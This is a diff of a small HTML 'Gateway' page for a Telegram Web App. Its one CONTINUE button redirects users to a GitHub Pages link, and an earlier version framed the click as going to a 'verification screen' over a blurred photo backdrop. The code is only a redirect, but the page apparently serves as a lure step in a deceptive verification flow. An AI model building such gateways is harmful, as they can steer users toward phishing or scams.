@@ -6,60 +6,31 @@
     <title>Gateway</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            margin: 0; padding: 0;
-            background: #000; color: white;
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg');
-            background-size: cover;
+        body { margin: 0; background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        .btn { 
+            background: #0088cc; color: white; border: none; padding: 20px 60px; 
+            border-radius: 15px; font-size: 22px; font-weight: bold; cursor: pointer; 
+            box-shadow: 0 5px #005580; 
         }
-        .container {
-            text-align: center;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            padding: 40px 20px;
-            border-radius: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            width: 280px;
-        }
-        .continue-btn {
-            background: #0088cc;
-            border: none;
-            padding: 18px 0;
-            width: 100%;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            border-radius: 12px;
-            cursor: pointer;
-            box-shadow: 0 5px 0 #005580;
-            transition: 0.2s;
-        }
-        .continue-btn:active {
-            transform: translateY(3px);
-            box-shadow: none;
-        }
-        p { font-size: 14px; margin-bottom: 25px; opacity: 0.9; }
+        .btn:active { transform: translateY(3px); box-shadow: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <p>Click the button below to continue to the verification screen.</p>
-        <!-- এটি ক্লিক করলে index.html ওপেন হবে -->
-        <button class="continue-btn" onclick="openMainApp()">CONTINUE ➡️</button>
-    </div>
+    <!-- এই বাটনটি ক্লিক করলে আপনার নির্দিষ্ট লিংকটি ওপেন হবে -->
+    <button class="btn" onclick="openTargetApp()">CONTINUE ➡️</button>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        function openMainApp() {
-            // এটি আপনার অরিজিনাল index.html পেজে নিয়ে যাবে (একই উইন্ডোতে)
-            const mainLink = "https://rony90790.github.io/View-code-button-CHEK-/index.html";
-            window.location.replace(mainLink);
+        function openTargetApp() {
+            // আপনার দেওয়া অরিজিনাল লিংক
+            const targetLink = "https://rony90790.github.io/View-code-button-CHEK-/";
+            
+            // এটি একই উইন্ডোতে আপনার লিংকটি লোড করবে, কোনো ব্রাউজার পপ-আপ ছাড়াই
+            window.location.replace(targetLink);
         }
     </script>
 </body>
